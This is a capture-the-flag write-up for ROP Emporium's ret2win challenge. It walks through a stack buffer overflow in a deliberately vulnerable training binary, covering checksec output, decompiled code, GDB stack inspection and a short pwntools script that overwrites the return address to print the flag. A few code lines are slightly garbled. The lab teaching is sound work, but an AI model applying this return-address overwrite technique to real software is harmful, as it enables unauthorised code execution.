# Challenge 1 - ret2win

## Description

ret2win means "return here to win" and it's recommended you start with this challenge.

Let's start by inspecting the binary:
```
mfumega@pwn-boy:/pwn-boy$ file ret2win
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
mfumega@pwn-boy:/pwn-boy$ pwn checksec ret2win
[*] '/pwn-boy/ret2win'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

We can see here some information on the protections the binary has enabled, such as Partial RELRO, and NX enabled. 

Let's run the binary.
```
mfumega@pwn-boy:/pwn-boy$ ./ret2win
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> AAAAA
Thank you!

Exiting
``` 

The challenge itself its explaining what will happen. Is trying to fit 56 bytes of our input, on a 32 bytes variable. Now let's see whats going on with GDB, and try to understand better this behaviour. 

There is a main function, that calls to another one called `pwnme()`. 

If we open this binary with Ghidra we can see what this `pwnme` function is doing more clearly, even though its not totally necesary. Let's take a look at the `main` and `pwnme` functions, as well as the "winning" function `ret2win`:

```
undefined8 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  puts("ret2win by ROP Emporium");
  puts("x86_64\n");
  pwnme();
  puts("\nExiting");
  return 0;
}

void pwnme(void)

{
  undefined1 local_28 [32];
  
  memset(local_28,0,0x20);
  puts(
      "For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffe r!"
      );
  puts("What could possibly go wrong?");
  puts(
      "You there, may I have your input please? And don\'t worry about null bytes, we\'re using read ()!\n"
      );
  printf("> ");
  read(0,local_28,0x38);
  puts("Thank you!");
  return;
}

void ret2win(void)

{
  puts("Well done! Here\'s your flag:");
  system("/bin/cat flag.txt");
  return;
}
```

From this code, we know that the `pwnme` function relies on `read()` to capture our input. It will get 0x38 bytes, and store it into a 32 bytes variable, as the text shown at the beginning. 

This being said, let's now jump to GDB! 

I've placed a breakpoint right after the call to `read`: 
```
pwndbg> b *pwnme +97
Breakpoint 1 at 0x400749
pwndbg> r
```

When it asked for my input, I put: "AAAAAAAA"

After hitting the breakpoint, we can inspect the stack and see some useful information: 

```
 ► 0         0x400749 pwnme+97
   1         0x4006d7 main+64
   2   0x7ffff7da8d90 __libc_start_call_main+128
   3   0x7ffff7da8e40 __libc_start_main+128
   4         0x4005da _start+42
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/25gx $rsp
0x7fffffffdd00: 0x4141414141414141      0x000000000000000a
0x7fffffffdd10: 0x0000000000000000      0x0000000000000000
0x7fffffffdd20: 0x00007fffffffdd30      0x00000000004006d7
0x7fffffffdd30: 0x0000000000000001      0x00007ffff7da8d90
0x7fffffffdd40: 0x0000000000000000      0x0000000000400697
0x7fffffffdd50: 0x00000001ffffde30      0x00007fffffffde48
0x7fffffffdd60: 0x0000000000000000      0xf6a712e7147c73f9
0x7fffffffdd70: 0x00007fffffffde48      0x0000000000400697
0x7fffffffdd80: 0x0000000000000000      0x00007ffff7ffd040
0x7fffffffdd90: 0x0958ed18aefe73f9      0x0958fd520ef673f9
0x7fffffffdda0: 0x00007fff00000000      0x0000000000000000
0x7fffffffddb0: 0x0000000000000000      0x00007fffffffde48
0x7fffffffddc0: 0x0000000000000000
pwndbg>
``` 

From this capture from GDB we can see the following info: 
- We are at the pwnme+97 (0x400749)
- When this function ends, the program will continue at main+64 (0x4006d7)
- Our input starts at 0x7fffffffdd00 (we can see the 8 "A" (41 in hex)
- At address 0x7fffffffdd28 is stored the return address 0x40067

```
pwndbg> x/x 0x7fffffffdd28
0x7fffffffdd28: 0x00000000004006d7
pwndbg>
```

So, if we substract the start of our input, to the target memory address, we'll know how many bytes we need to use as padding before overwrite the return value (0x7fffffffdd28 - 0x7fffffffdd00). This will give 40 as a result, so if we put 40 bytes, the next 8 bytes will be the new return address. 
If we overwrite the actual address with the `ret2win` one, we should get the flag. 

Using pwntools: 
```
m pwn import *

binary_path = '/pwn-boy/ret2win'
p = process(binary_path)

offset = 40
ret2win_addr = 0x400756


payload = b'A' * offset
payload += p64(ret2win_addr)

p.sendline(payload)
response = p.recvall()
print(response.decode('latin-1'))
```

If we do it like this it will show the success message, but not the flag. It's a padding issue. Just add 1 to the ret2win address `ret2win_addr = 0x400756 + 1` and it will do the trick. 

We got the flag: 
```
> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
``` 

That's it for this challenge! 
